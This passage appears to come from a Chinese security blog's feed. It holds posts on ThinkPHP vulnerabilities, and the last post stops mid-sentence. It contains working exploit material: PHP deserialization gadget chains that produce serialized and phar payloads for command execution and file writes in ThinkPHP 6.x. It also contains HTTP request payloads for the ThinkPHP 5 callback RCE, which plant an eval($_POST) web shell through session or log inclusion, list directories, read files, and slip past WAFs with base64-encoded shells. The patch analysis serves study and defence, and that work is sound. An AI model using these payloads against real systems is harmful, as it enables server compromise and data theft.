class="token string single-quoted-string">'calc'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="../../../typora-user-images/image-20240918142310829.png" alt="image-20240918142310829" /></p><h3 id="三-其他反序列化链分析-2"><a class="markdownIt-Anchor" href="#三-其他反序列化链分析-2"></a> 三、其他反序列化链分析</h3><p>分析一下另一个写文件的利用链</p><p>上面分析过_toString的触发，这里找一下toString的其他利用位置：</p><p>下图中的类是可以走到__call方法的</p><p><img src="../../../typora-user-images/image-20240918100505845.png" alt="image-20240918100505845" /></p><p>__call方法的利用点就多了，继续找一下</p><p>output类可以调用任意类的write方法。</p><p><img src="../../../typora-user-images/image-20240918105538579.png" alt="image-20240918105538579" /></p><p>跟入到file类，依旧是任意类的write方法，但是第一个参数已经可控了。第二个参数会是我们上面write传的第一个messages参数。（就是最初触发点的参数）</p><p><img src="../../../typora-user-images/image-20240918105748941.png" alt="image-20240918105748941" /></p><p>接下来继续找两个参数的write方法。file类完美符合要求。</p><p><img src="../../../typora-user-images/image-20240918110305467.png" alt="image-20240918110305467" /></p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php  namespace think\model\concern&#123;      trait Attribute&#123;          private $data &#x3D; [&#39;test&#39;];     &#125;  &#125;  namespace think\view\driver&#123;      class Php&#123;&#125;  &#125;namespace think\session\driver&#123;    class File&#123;    &#125;&#125;namespace League\Flysystem&#123;    class File&#123;        protected $path;        protected $filesystem;        public function __construct($File)&#123;            $this-&gt;path&#x3D;&#39;test.php&#39;;            $this-&gt;filesystem&#x3D;$File;        &#125;    &#125;&#125;namespace think\console&#123;    use League\Flysystem\File;    class Output&#123;        protected $styles&#x3D;[];        private $handle;        public function __construct($File)&#123;            $this-&gt;styles[]&#x3D;&#39;getDomainBind&#39;;            $this-&gt;handle&#x3D;new File($File);        &#125;    &#125;&#125;  namespace think&#123;      abstract class Model&#123;          use model\concern\Attribute;          private $lazySave;          protected $withEvent;          protected $table;          function __construct($cmd,$File)&#123;              $this-&gt;lazySave &#x3D; true;              $this-&gt;withEvent &#x3D; false;              $this-&gt;table &#x3D; new route\Url(new Middleware,new console\Output($File),$cmd);          &#125;      &#125;      class Middleware&#123;          public $request &#x3D; 2333;      &#125;   &#125;  namespace think\model&#123;      use think\Model;      class Pivot extends Model&#123;&#125;   &#125;  namespace think\route&#123;      class Url      &#123;          protected $url &#x3D; &#39;a:&#39;;          protected $domain;          protected $app;          protected $route;          function __construct($app,$route,$cmd)&#123;              $this-&gt;domain &#x3D; $cmd;              $this-&gt;app &#x3D; $app;              $this-&gt;route &#x3D; $route;          &#125;      &#125;  &#125;  namespace&#123;      echo base64_encode(serialize(new think\Model\Pivot(&#39;&lt;?php phpinfo(); exit(); ?&gt;&#39;,new think\session\driver\File)));  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5thinkphp61x反序列化"><a class="markdownIt-Anchor" href="#5thinkphp61x反序列化"></a> ⑤ThinkPHP6.1.x反序列化</h2><p>测试版本6.1.4</p><p>tp6.0的链可以通用</p><ul><li>命令执行</li></ul><p><img src="../../../typora-user-images/image-20240918142423600.png" alt="image-20240918142423600" /></p><ul><li><p>写文件</p><p>6.1 版本默认不携带Flysytem类，导致上面分析的写文件链无法再次使用。</p><p><img src="../../../typora-user-images/image-20240918143955561.png" alt="image-20240918143955561" /></p></li></ul><p><img src="../../../typora-user-images/image-20240918143857435.png" alt="image-20240918143857435" /></p><h2 id="6thinkphp80x反序列化"><a class="markdownIt-Anchor" href="#6thinkphp80x反序列化"></a> ⑥ThinkPHP8.0.x反序列化</h2><p><a href="https://xz.aliyun.com/t/14904">https://xz.aliyun.com/t/14904</a></p><p>暂时不自己分析了，可以看一下这篇文章，其实上面分析了这么多条链。自己挖掘也就很简单了</p><p>文章中也是toString走到call，然后走到callback的sink点，完成了利用。</p><p>主要难点在于if条件的构造，确实是个麻烦的大工程。</p><p>顺带推荐一个题目：强网杯pop_master</p><h1 id="0x02-实战利用"><a class="markdownIt-Anchor" href="#0x02-实战利用"></a> 0x02 实战利用</h1><p>刚开始学反序列化的时候一直有疑问，tp的反序列化漏洞如何利用呢？？为什么网络上都是分析pop链，而很少有实战的例子呢？</p><p>其实这也就引出了反序列化漏洞的前提：</p><ul><li>存在反序列化pop链</li><li>存在反序列化的入口，也就是接收数据并进行反序列化的操作。</li></ul><p>因为tp实质上是一个框架，所以你并不知道开发者可能如何写业务，如果业务中涉及到处理对象，那就很有可能写了反序列化的入口。</p><p>总结一下，实战中的入口主要有如下：</p><h2 id="原生反序列化"><a class="markdownIt-Anchor" href="#原生反序列化"></a> 原生反序列化</h2><p>字面意思</p><p>php自带的unserialize方法</p><p><img src="../../../typora-user-images/image-20240918151516506.png" alt="image-20240918151516506" /></p><h2 id="redis模块"><a class="markdownIt-Anchor" href="#redis模块"></a> Redis模块</h2><p>既然自带了unserialize方法，那么我们去tp框架搜索一下该方法，有没有什么方法是封装了这个函数的呢？</p><ul><li>不难发现redis模块的get方法获取键值的时候是调用反序列化方法的</li></ul><p>值以think_serialize开始会进行反序列化</p><p><img src="../../../typora-user-images/image-20240918152247395.png" alt="image-20240918152247395" /></p><p><strong>当然高版本的get方法实现起来又不一样了，tp6是另一套写法，tp5这个实战比较多，就拿这个举例了</strong></p><h2 id="session反序列化"><a class="markdownIt-Anchor" href="#session反序列化"></a> Session反序列化</h2><p><a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p><p>ctf比较常见</p><p>当然实战中也有产品能遇到，比如：<strong>瑞友天翼应用虚拟化</strong></p><h2 id="phar反序列化"><a class="markdownIt-Anchor" href="#phar反序列化"></a> Phar反序列化</h2><p>phar反序列化是实战中的大头，先简单总结一下，phar文件的metadata部分存储的是反序列化数据，当使用phar协议处理文件时，会对这部分数据进行反序列化。（<strong>PHP8已经做了修复</strong>）</p><p>主要影响的函数就是文件操作相关的。</p><p><img src="../../../typora-user-images/20191105195413-fc4b3ca0-ffc2-1.png" alt="20191105195413-fc4b3ca0-ffc2-1" /></p><p>实际上很好理解：</p><ol><li>生成恶意的phar文件。（后缀无要求）</li></ol><p>代码上半部分是上面分析的pop链。</p><p>下半部分重点把metadata部分设置成pop链的对象即可。</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpnamespace think &#123;        abstract class Model &#123;                private $lazySave &#x3D; false;        private $data &#x3D; [];        private $exists &#x3D; false;        protected $table;        private $withAttr &#x3D; [];        protected $json &#x3D; [];        protected $jsonAssoc &#x3D; false;                public function __construct($obj&#x3D;&#39;&#39;) &#123;            $this-&gt;lazySave &#x3D; true;            $this-&gt;data &#x3D; [&#39;calc&#39;&#x3D;&gt;[&#39;calc&#39;]];            $this-&gt;exists &#x3D; true;            $this-&gt;table &#x3D; $obj;                $this-&gt;withAttr &#x3D; [&#39;calc&#39;&#x3D;&gt;[&#39;system&#39;]];            $this-&gt;json &#x3D; [&#39;calc&#39;];            $this-&gt;jsonAssoc &#x3D; true;        &#125;    &#125;&#125;namespace think\model &#123;    use think\Model;    class Pivot extends Model &#123;    &#125;   &#125;namespace&#123;        $p &#x3D; new \think\model\Pivot(new \think\model\Pivot());    $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;代码里面必须是phar后缀，生成完使用伪协议触发不需考虑后缀    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub    $phar-&gt;setMetadata($p); &#x2F;&#x2F;自定义metadata    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F; 添加文件    &#x2F;&#x2F;签名自动计算    $phar-&gt;stopBuffering();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>伪协议触发（实战中需要自己尝试上传文件）</li></ol><p><img src="../../../typora-user-images/image-20240918161944044.png" alt="image-20240918161944044" /></p><p><strong>分析到这里也能看到，我们代码中必须是整个参数都可以控制，这样才能控制phar前缀</strong></p><h1 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接</h1><p><a href="https://blog.riskivy.com/%e6%8c%96%e6%8e%98%e6%9a%97%e8%97%8fthinkphp%e4%b8%ad%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%88%a9%e7%94%a8%e9%93%be/">https://blog.riskivy.com/挖掘暗藏thinkphp中的反序列利用链/</a></p><p><a href="https://www.anquanke.com/post/id/251318#h2-2">https://www.anquanke.com/post/id/251318#h2-2</a></p><p><a href="https://xz.aliyun.com/t/8163">https://xz.aliyun.com/t/8163</a></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/">https://github.com/Mochazz/ThinkPHP-Vuln/</a></p><p><a href="https://xz.aliyun.com/t/11382">https://xz.aliyun.com/t/11382</a></p><p><a href="https://xz.aliyun.com/t/9310">https://xz.aliyun.com/t/9310</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-反序列化利用链&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x01-反序列化利用链&quot;&gt;&lt;/a&gt; 0x01 反序列化利用链&lt;/h1&gt;
&lt;h2 id=&quot;审计思路&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; hr</summary>
      
    
    
    
    
    <category term="ThinkPHP" scheme="https://cyxsec.github.io/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5-Rce实战篇</title>
    <link href="https://cyxsec.github.io/2023/05/ThinkPHP5-Rce%E5%AE%9E%E6%88%98%E7%AF%87/"/>
    <id>https://cyxsec.github.io/2023/05/ThinkPHP5-Rce%E5%AE%9E%E6%88%98%E7%AF%87/</id>
    <published>2023-05-16T06:36:57.000Z</published>
    <updated>2024-09-19T02:10:18.903Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序"><a class="markdownIt-Anchor" href="#序"></a> 序</h1><p>首先说的这个rce是callback的那个rce，这个洞实战遇见了几次，感觉有几点很有意思，因此记录一下</p><h1 id="0x01-漏洞验证"><a class="markdownIt-Anchor" href="#0x01-漏洞验证"></a> 0x01 漏洞验证</h1><ol><li>网上的很多工具都采用这种方式做漏洞验证，但是这种并没有考虑phpinfo被disable</li></ol><p><strong>aaaaa</strong>=<strong>phpinfo</strong>&amp;<strong>_method</strong>=<strong>__construct</strong>&amp;<strong>filter</strong>[]=<strong>call_user_func</strong>&amp;<strong>method</strong>=<strong>post</strong></p><p><img src="../../../typora-user-images/image-20240918164858827.png" alt="image-20240918164858827" /></p><ol start="2"><li><p>xray采用了var_dump的方式，但判断条件写的有些问题，直接匹配字符，导致很多误报。</p></li><li><p>其实可以在xray的方式上做优化</p></li></ol><ul><li>添加规则，判断string和length关键字等等</li></ul><p><img src="../../../typora-user-images/image-20240918165333020.png" alt="image-20240918165333020" /></p><ul><li>再套一层filter，用常规md5计算（环境都是没开debug的，因此默认也能用）</li></ul><p><strong>aaaaa</strong>=<strong>123456</strong>&amp;<strong>_method</strong>=<strong>__construct</strong>&amp;<strong>filter</strong>[]=<strong>md5</strong>&amp;<strong>filter</strong>[]=<strong>var_dump</strong>&amp;<strong>method</strong>=<strong>post</strong></p><p><img src="../../../typora-user-images/image-20240919094205025.png" alt="image-20240919094205025" /></p><h1 id="0x02-漏洞利用"><a class="markdownIt-Anchor" href="#0x02-漏洞利用"></a> 0x02 漏洞利用</h1><h2 id="一-assert无法使用"><a class="markdownIt-Anchor" href="#一-assert无法使用"></a> 一、assert无法使用</h2><p>众所周知，php7的assert变成非函数了，也就无法callback调用，达到执行任意代码的效果，这样利用起来就很麻烦了。</p><p>可以尝试更换其他函数，如system等命令执行函数。</p><p><strong>甚至你可以使用unserialize，结合pop链做漏洞利用</strong></p><h2 id="二-文件包含利用"><a class="markdownIt-Anchor" href="#二-文件包含利用"></a> 二、文件包含利用</h2><p>这个在实战中经常使用</p><h3 id="日志包含"><a class="markdownIt-Anchor" href="#日志包含"></a> 日志包含</h3><pre class="line-numbers language-none"><code class="language-none">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;..&#x2F;data&#x2F;runtime&#x2F;log&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>控制器报错没有记录到日志里面（?s=)，因此可以直接用这个洞，callback的调用位置给加上payload</p><p><strong>aaaaa</strong>=<strong>&lt;</strong>?<strong>php</strong> <strong>phpinfo</strong>();?&gt;&amp;<strong>_method</strong>=<strong>__construct</strong>&amp;<strong>filter</strong>[]=<strong>call_user_func</strong>&amp;<strong>method</strong>=<strong>post</strong></p><p><img src="../../../typora-user-images/image-20240918171433593.png" alt="image-20240918171433593" /></p><p><img src="../../../typora-user-images/image-20240918171628457.png" alt="image-20240918171628457" /></p><h3 id="session包含"><a class="markdownIt-Anchor" href="#session包含"></a> session包含</h3><p>设置session</p><pre class="line-numbers language-none"><code class="language-none">_method&#x3D;__construct&amp;filter[]&#x3D;think\Session::set&amp;method&#x3D;get&amp;get[]&#x3D;&lt;?php eval($_POST[&#39;c&#39;])?&gt;&amp;server[]&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="../../../typora-user-images/image-20240918172313542.png" alt="image-20240918172313542" /></p><p>linux存tmp</p><pre class="line-numbers language-none"><code class="language-none">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;&#x2F;tmp&#x2F;sess_ID&amp;c&#x3D;phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>windows看实际情况</p><p><img src="../../../typora-user-images/image-20240918172450829.png" alt="image-20240918172450829" /></p><h4 id="实战遇到的问题"><a class="markdownIt-Anchor" href="#实战遇到的问题"></a> *实战遇到的问题：</h4><p>实战中我们可能考虑使用这种写shell的方式</p><p><img src="../../../typora-user-images/image-20240918181907270.png" alt="image-20240918181907270" /></p><p>但是我们发现我们写入的session文件变样了</p><p><img src="../../../typora-user-images/image-20240918182839115.png" alt="image-20240918182839115" /></p><p>跟一下tp的代码：</p><p>发现字段会以. 做区分，因此我们上面的文件名会分隔开</p><p><img src="../../../typora-user-images/image-20240918182918927.png" alt="image-20240918182918927" /></p><p><img src="../../../typora-user-images/image-20240918183023873.png" alt="image-20240918183023873" /></p><p>换个写shell方式即可</p><p><img src="../../../typora-user-images/image-20240918183107326.png" alt="image-20240918183107326" /></p><h2 id="三-其他利用"><a class="markdownIt-Anchor" href="#三-其他利用"></a> 三、其他利用</h2><h3 id="列目录"><a class="markdownIt-Anchor" href="#列目录"></a> 列目录</h3><p><strong>_method</strong>=<strong>__construct</strong>&amp;<strong>filter</strong>[]=<strong>scandir</strong>&amp;<strong>filter</strong>[]=<strong>var_dump</strong>&amp;<strong>method</strong>=<strong>GET</strong>&amp;<strong>get</strong>[]=<strong>/</strong></p><p>可以利用payload读取目录</p><ul><li>一是可以根据这个payload判断系统是否为linux（windows默认会列当前盘符跟目录）</li></ul><p><img src="../../../typora-user-images/image-20240918172825785.png" alt="image-20240918172825785" /></p><ul><li>二是可以通过payload寻找日志和session等，配合文件读取，可以做的事情很多</li></ul><h3 id="读文件"><a class="markdownIt-Anchor" href="#读文件"></a> 读文件</h3><p>配合列目录可以做的事情有很多，在极端环境下可以拿到很多东西</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>highlight_file<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token constant">GET</span><span class="token operator">&amp;</span>get<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="../../../typora-user-images/image-20240918173108619.png" alt="image-20240918173108619" /></p><h1 id="0x03-waf绕过"><a class="markdownIt-Anchor" href="#0x03-waf绕过"></a> 0x03 waf绕过</h1><p>日志包含的时候，关键字被拦截怎么办？</p><ul><li>编码写入</li></ul><p>利用上面的思路，编码写入shell</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">_method=__construct&amp;method=get&amp;filter=think\Session::set&amp;get[]=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"OTE4LnBocA=="</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PD9waHAgcGhwaW5mbygpOz8%2b"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>关键函数过滤</li></ul><p><a href="https://xz.aliyun.com/t/10534">https://xz.aliyun.com/t/10534</a></p><p>这篇文章采取了伪协议+字符反转的方式绕过关键字</p><p>如果校验了php标签之类的，那么payload就只能编码写进去，后面就要结合伪协议利用了。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token class-name class-name-fully-qualified static-context">think<span class="token punctuation">\</span>Session</span><span class="token operator">::</span><span class="token constant">set</span><span class="token operator">&amp;</span>method<span class="token operator">=</span>get<span class="token operator">&amp;</span>get<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>aaPD9waHAgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsnYWJjJ10pKTs<span class="token operator">/</span>Pg<span class="token operator">&amp;</span>server<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="../../../typora-user-images/image-20240919100313292.png" alt="image-20240919100313292" /></p><p>这里的bb是为了补充base64的位数，后面使用伪协议decode时候可以正确解码到payload。因为session格式是固定的。</p><p><img src="../../../typora-user-images/20221011121738-a44e4b00-491b-1.png" alt="20221011121738-a44e4b00-491b-1" /></p><h1 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章"></a> 参考文章</h1><p><a href="https://xz.aliyun.com/t/10397">https://xz.aliyun.com/t/10397</a></p><p><a href="https://xz.aliyun.com/t/10534">https://xz.aliyun.com/t/10534</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;序&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#序&quot;&gt;&lt;/a&gt; 序&lt;/h1&gt;
&lt;p&gt;首先说的这个rce是callback的那个rce，这个洞实战遇见了几次，感觉有几点很有意思，因此记录一下&lt;/p&gt;
&lt;h1 id=&quot;0x01-漏洞验证&quot;</summary>
      
    
    
    
    
    <category term="ThinkPHP" scheme="https://cyxsec.github.io/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP框架默认RCE漏洞分析</title>
    <link href="https://cyxsec.github.io/2023/05/ThinkPHP%E9%BB%98%E8%AE%A4%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://cyxsec.github.io/2023/05/ThinkPHP%E9%BB%98%E8%AE%A4%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-05-16T06:36:57.000Z</published>
    <updated>2024-09-19T02:08:30.725Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-启"><a class="markdownIt-Anchor" href="#0x00-启"></a> 0x00 启</h1><p>黑盒debug开启会报错出具体版本</p><p>白盒看本地tp代码</p><p>tp3 在目录的ThinkPHP文件中</p><p><img src="../../../typora-user-images/image-20240716150129242.png" alt="image-20240716150129242" /></p><p>TP5.0在目录的base.php文件中 : thinkphp/base.php</p><p><img src="../../../typora-user-images/image-20240716165942332.png" alt="image-20240716165942332" /></p><p>TP5.1: thinkphp/library/think/App.php</p><p><img src="../../../typora-user-images/image-20240725155723023.png" alt="image-20240725155723023" /></p><h1 id="0x01-thinkphp-2x-命令执行"><a class="markdownIt-Anchor" href="#0x01-thinkphp-2x-命令执行"></a> 0x01 ThinkPHP 2.x 命令执行</h1><p>PHP5的preg_replace的/e模式的命令执行</p><p><img src="../../../typora-user-images/image-20240716155011163.png" alt="image-20240716155011163" /></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'正则规则'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'替换字符'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'目标字符'</span><span class="token punctuation">)</span>    正则规则使用e修饰时，如果从目标字符匹配到正则规则，那么替换字符的php语句就会执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这个分析过程参考这篇文章即可，实战几乎没遇见过TP2，以后有空再分析吧：<a href="https://www.freebuf.com/articles/people/223149.html">https://www.freebuf.com/articles/people/223149.html</a></p><h1 id="0x02-thinkphp-5x-命令执行兼容模式支持实例化任意控制器导致rce"><a class="markdownIt-Anchor" href="#0x02-thinkphp-5x-命令执行兼容模式支持实例化任意控制器导致rce"></a> 0x02 ThinkPHP 5.x 命令执行（兼容模式支持实例化任意控制器导致RCE）</h1><h2 id="1影响版本"><a class="markdownIt-Anchor" href="#1影响版本"></a> 1.影响版本</h2><p>ThinkPHP v5.0.x &lt;=x&lt;= 5.0.22</p><p>ThinkPHP v5.1.x &lt;=x&lt;= 5.1.30</p><p>patch方式：</p><p>添加正则判断controller名</p><p><a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f">https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f</a></p><p>5.0<img src="../../../typora-user-images/image-20240716162407625.png" alt="image-20240716162407625" /></p><p><a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a></p><p>5.1</p><p><img src="../../../typora-user-images/image-20240725151852349.png" alt="image-20240725151852349" /></p><h2 id="2漏洞分析"><a class="markdownIt-Anchor" href="#2漏洞分析"></a> 2.漏洞分析</h2><p>本地调试环境版本为5.0.22</p><p>补丁判断了控制器只允许有字母数字</p><p>先跟一下5.0.22的$controller都做了什么</p><p>访问index.php</p><ul><li>因为没有传入控制器，默认的控制器是Index</li><li>默认配置$convert为true，会将控制器名小写处理</li></ul><p><img src="../../../typora-user-images/image-20240723173927452.png" alt="image-20240723173927452" /></p><p><strong>分析流程：</strong></p><ol><li>进入下方的parseName静态方法</li></ol><ul><li>做的是名称风格转换，就是驼峰、首字母大写和蛇形的编码名称的转换，不是核心问题</li></ul><p><img src="../../../typora-user-images/image-20240723174505492.png" alt="image-20240723174147581" /></p><ol start="2"><li>进入下方的操作$controller变量的位置，跟入Loader的controller静态方法</li></ol><p><img src="../../../typora-user-images/image-20240724175539279.png" alt="image-20240724175539279" /></p><p><img src="../../../typora-user-images/image-20240723174521168.png" alt="image-20240723174521168" /></p><ol start="3"><li>看注释发现是实例化控制器的，传入的形参为$name，跟入下方的getModuleAndClass静态方法</li></ol><p><img src="../../../typora-user-images/image-20240723174847375.png" alt="image-20240723174847375" /></p><ol start="4"><li>两个if，第一个判断传入的控制器名字是否包含’\‘字符，不包含的话会走下面的else，下面会判断是否存在’/‘字符，存在会按照’/'字符分割返回。</li></ol><p><img src="../../../typora-user-images/image-20240723175203807.png" alt="image-20240723175203807" /></p><ol start="5"><li>跟入下方赋值<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi mathvariant="normal">的</mi><mi>p</mi><mi>a</mi><mi>r</mi><mi>s</mi><mi>e</mi><mi>C</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi mathvariant="normal">方</mi><mi mathvariant="normal">法</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">上</mi><mi mathvariant="normal">面</mi><mi mathvariant="normal">取</mi><mi mathvariant="normal">得</mi><mi mathvariant="normal">的</mi></mrow><annotation encoding="application/x-tex">class的parseClass方法，参数为我们上面取得的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">的</span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">面</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">的</span></span></span></span>module和$name（控制器名称）</li></ol><p>关注下下面做了什么</p><ul><li>替换name中的/和. 再按照字符划分为数组</li><li>parseName我们上面分析过，是做名称转换的（驼峰、首字母大写和蛇形），返回数组最后一个元素</li><li>根据配置，看后缀是否配置，将后缀拼接到$class名字中</li><li>将去掉最后元素的原始数组拼接回字符</li></ul><p>返回值：返回命名空间+模块+层名+类名+类名后缀</p><p><img src="../../../typora-user-images/image-20240723181604729.png" alt="image-20240723181604729" /></p><p>最终返回数组</p><p><img src="../../../typora-user-images/image-20240723182451423.png" alt="image-20240723182451423" /></p><ol start="6"><li>回到上面的loader的静态方法controller中，获取返回值后，会调用invokeClass方法，这个看起来就是实例化类的方法， 跟入</li></ol><p><img src="../../../typora-user-images/image-20240723182537533.png" alt="image-20240723182537533" /></p><p>果然是反射实例化类</p><p><img src="../../../typora-user-images/image-20240723182700386.png" alt="image-20240723182700386" /></p><ol start="7"><li>实例化后，发现还会获取当前的action参数，并调用实例化类的对应方法</li></ol><p>这里的action与上面的controller获取方式类似</p><p><img src="../../../typora-user-images/image-20240723182955473.png" alt="image-20240723182955473" /></p><p><img src="../../../typora-user-images/image-20240723182833361.png" alt="image-20240723182833361" /></p><p>整个功能就跟完了，我们发现最后是实例化命名空间类，并调用了对应的方法，盲猜一下这是一个可以实例化任意方法的漏洞， 